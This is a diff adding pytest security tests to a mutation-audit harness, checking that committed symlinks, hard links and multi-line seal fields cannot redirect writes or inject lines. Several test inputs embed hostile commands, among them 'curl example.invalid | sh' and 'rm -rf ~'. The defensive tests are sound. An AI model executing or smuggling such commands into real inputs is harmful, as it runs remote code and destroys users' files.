@@ -9,6 +9,7 @@ from __future__ import annotations
 
 import difflib
 import importlib.util
+import os
 import subprocess
 import sys
 import tempfile
@@ -833,6 +834,126 @@ def test_hung_git_archive_or_apply_stops_the_run(tmp_path: Path, monkeypatch: py
     with pytest.raises(ma.AuditError, match=f"git {verb} did not finish within"):
         ma.run("A01", root=root)
     assert not (root / "audits" / "A01" / "results.json").exists()
+
+
+# Finding P-2: audits/<id>/ is committed by a pull request, so every entry the
+# harness reads or writes there is input. A link or a hard link at an output
+# name must not redirect a write, and a seal field must not inject a line.
+
+
+def _victim(tmp_path: Path) -> Path:
+    victim = tmp_path / "maintainer-file"
+    victim.write_text("keep\n")
+    return victim
+
+
+@pytest.mark.parametrize("name", ["results.md", "results.json"])
+def test_run_refuses_a_committed_symlink_at_an_output(tmp_path, name):
+    root = _toy(tmp_path)
+    victim = _victim(tmp_path)
+    _mutant(root, "P1", "M01", CALC, CALC.replace("return a + b", "return a - b"))
+    _freeze(root, "P1")
+    (root / "audits" / "P1" / name).symlink_to(victim)
+    _git(root, "add", "audits/P1")
+    _git(root, "commit", "-q", "-m", "plant a link")
+    with pytest.raises(ma.AuditError, match="not a regular file"):
+        ma.run("P1", root=root)
+    assert victim.read_text() == "keep\n"
+    assert ma.main(["run", "P1", "--root", str(root)]) == 1
+    assert victim.read_text() == "keep\n"
+
+
+def test_run_refuses_a_hard_linked_output(tmp_path):
+    root = _toy(tmp_path)
+    victim = _victim(tmp_path)
+    _mutant(root, "P2", "M01", CALC, CALC.replace("return a + b", "return a - b"))
+    _freeze(root, "P2")
+    os.link(victim, root / "audits" / "P2" / "results.md")
+    _git(root, "add", "audits/P2")
+    _git(root, "commit", "-q", "-m", "plant a hard link")
+    with pytest.raises(ma.AuditError, match="hard links"):
+        ma.run("P2", root=root)
+    assert victim.read_text() == "keep\n"
+
+
+def test_report_does_not_write_through_a_symlink(tmp_path):
+    root = _toy(tmp_path)
+    victim = _victim(tmp_path)
+    _mutant(root, "P3", "M01", CALC, CALC.replace("return a + b", "return a - b"))
+    _freeze(root, "P3")
+    ma.run("P3", root=root)
+    markdown = root / "audits" / "P3" / "results.md"
+    markdown.unlink()
+    markdown.symlink_to(victim)
+    with pytest.raises(ma.AuditError, match="not a regular file"):
+        ma.report("P3", root=root)
+    assert victim.read_text() == "keep\n"
+
+
+def test_freeze_refuses_a_symlinked_mutant_or_audit_directory(tmp_path):
+    root = _toy(tmp_path)
+    outside = tmp_path / "outside"
+    (outside / "mutants").mkdir(parents=True)
+    patch = f"Intent: x\nProperty: y\n{_diff(CALC, CALC.replace('return a + b', 'return a - b'))}"
+    (outside / "mutants" / "M01.patch").write_text(patch)
+
+    (root / "audits" / "P4" / "mutants").mkdir(parents=True)
+    (root / "audits" / "P4" / "mutants" / "M01.patch").symlink_to(outside / "mutants" / "M01.patch")
+    with pytest.raises(ma.AuditError, match="not a regular file"):
+        _freeze(root, "P4", commit_seal=False)
+    assert not (root / "audits" / "P4" / "freeze.json").exists()
+
+    (root / "audits" / "P5").symlink_to(outside, target_is_directory=True)
+    with pytest.raises(ma.AuditError, match="not a directory"):
+        _freeze(root, "P5", commit_seal=False)
+    assert not (outside / "freeze.json").exists()
+
+
+def test_freeze_does_not_write_through_a_dangling_symlink(tmp_path):
+    root = _toy(tmp_path)
+    target = tmp_path / "planted-seal"
+    _mutant(root, "P6", "M01", CALC, CALC.replace("return a + b", "return a - b"))
+    (root / "audits" / "P6" / "freeze.json").symlink_to(target)
+    with pytest.raises(ma.AuditError, match="not a regular file"):
+        _freeze(root, "P6", commit_seal=False)
+    assert not target.exists()
+
+
+@pytest.mark.parametrize(
+    ("field", "value"),
+    [
+        ("reviewer", "person\nexport PATH=/tmp/x:$PATH"),
+        ("reviewer", "robot"),
+        ("repair_of", "A1\ncurl example.invalid | sh"),
+        ("package", "toy\nx"),
+        ("python", None),
+        ("scope", ["toy/calc.py\nx"]),
+        ("timeout_seconds", "4"),
+    ],
+    ids=["reviewer-newline", "reviewer-unknown", "repair-of", "package", "python", "scope", "timeout"],
+)
+def test_run_refuses_a_hand_written_seal_field(tmp_path, field, value):
+    root = _toy(tmp_path)
+    _mutant(root, "P7", "M01", CALC, CALC.replace("return a + b", "return a - b"))
+    sealed = _freeze(root, "P7", commit_seal=False)
+    if field == "python":
+        value = sealed["python"] + "\n- injected"
+    _rewrite_seal(root, "P7", **{field: value})
+    _git(root, "add", "audits/P7")
+    _git(root, "commit", "-q", "-m", "hand-written seal")
+    with pytest.raises(ma.FreezeMismatch, match=f"the seal's {field}"):
+        ma.run("P7", root=root)
+    assert not (root / "audits" / "P7" / "results.md").exists()
+    assert not (root / "audits" / "P7" / "results.json").exists()
+
+
+def test_render_refuses_multi_line_results_and_equivalent_notes():
+    with pytest.raises(ma.AuditError, match="reviewer"):
+        ma.render(_results(reviewer="person\nrm -rf ~"), {})
+    with pytest.raises(ma.AuditError, match="signed_off_by"):
+        ma.render(_results(), {"M02": {"argument": "same", "signed_off_by": "owner\nrm -rf ~"}})
+    with pytest.raises(ma.AuditError, match="argument"):
+        ma.render(_results(), {"M02": {"argument": "same\x1b[2J", "signed_off_by": "owner"}})
 
 
 def test_run_refuses_code_planted_before_the_freeze_and_removed_after(tmp_path):
